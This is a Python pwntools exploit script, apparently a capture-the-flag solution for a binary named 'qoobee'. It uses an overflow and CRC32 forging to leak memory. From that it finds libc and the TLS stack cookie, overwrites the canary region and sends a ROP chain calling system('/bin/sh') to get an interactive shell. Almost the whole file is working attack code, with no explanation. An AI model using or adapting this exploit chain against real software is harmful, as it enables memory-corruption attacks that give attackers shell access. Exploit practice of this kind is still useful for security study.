from pwn import *
from binascii import *
import crc32

r = process('./qoobee')


def leak(str, addr, dest):	#leak qword	
	n = (dest - addr -8)/4 + 2
	print n
	res = ''
	for i in range(n):
		r.recvuntil('# ')
		r.send('1\n')
		r.recvuntil('How many dounts you want? ')
		r.send('x'*2040 + p64(addr) + 'aaaaaaaa\n')
		r.recvuntil('# ')
		r.send('3\n')
		r.recvuntil('Input your local system timestamp: ')
		r.send('aaa\n')
		r.recvuntil('Response: ')
		x = int(r.recvuntil('\n')[:-1], 16)
		x = crc32.forge(x, str, 8)[8:]
#		print hex(u32(x))
#		print b2a_hex(x)
		str = str[4:]+x
		res += x
		addr += 4
#		print 'str',b2a_hex(str)
#		print b2a_hex(res)
	return u64(res[-8:])

t = leak(p64(0x0000000000601e08), 0x602000, 0x602020)
libc = t - 5868192
m_end = libc + 17211392
tls = m_end - 18624 + 0xc000 - 65536

payload  = p64(tls)*((145200-0x200)/8)
print 'tls',hex(tls)
cookie = leak(p64(tls), tls, tls+0x28)
print 'cookie',hex(cookie)
p = leak(p64(tls), tls, tls+0x8)
print 'p',hex(p)


payload += p64(0)
for i in range(0x200/8 - 1):
	tmp = leak(p64(0), tls-0x200, tls - 0x200 + (i+1)*8)
#	print hex(tls - 0x200 + (i+1)*8), '->',hex(tmp)
	payload += p64(tmp)
payload += 'a'*(145200%8) 
payload += p64(tls) + p64(p) + p64(tls) + "cccccccc"*2 + p64(cookie) + p64(0x0400D79 ^ 0x69ea000000000020)


r.recvuntil('# ')
r.sendline('1')
r.recvuntil('How many dounts you want? ')
r.sendline('135168')
r.recvuntil(':')
r.sendline(payload)


pop_rdi_ret = 0x0000000000401503 
pop_rbp_ret = 0x0000000000400cb5
leave_ret = 0x0000000000400ddf
input = 0x0400E94
addr = tls - 0x300
wel = 0x400E55

lib = ELF('/usr/lib/libc.so.6')
puts = leak(p64(0x0000000000601e08), 0x602000, 0x602030)
base = puts - lib.symbols['puts']
i = lib.search('/bin/sh')
binsh = i.next() + base 
system_ = lib.symbols['system'] + base
print 'binsh',hex(binsh)
print 'system',hex(system_)

payload2  = 'a'*0xf8
payload2 += p64(cookie)
payload2 += p64(cookie)	#ebp
payload2 += p64(pop_rdi_ret)	
payload2 += p64(binsh)	
payload2 += p64(system_)	

raw_input()
r.recvuntil('# ')
r.sendline('2')
print r.recvuntil(':')
r.sendline(payload2)

r.interactive()


gdb find 

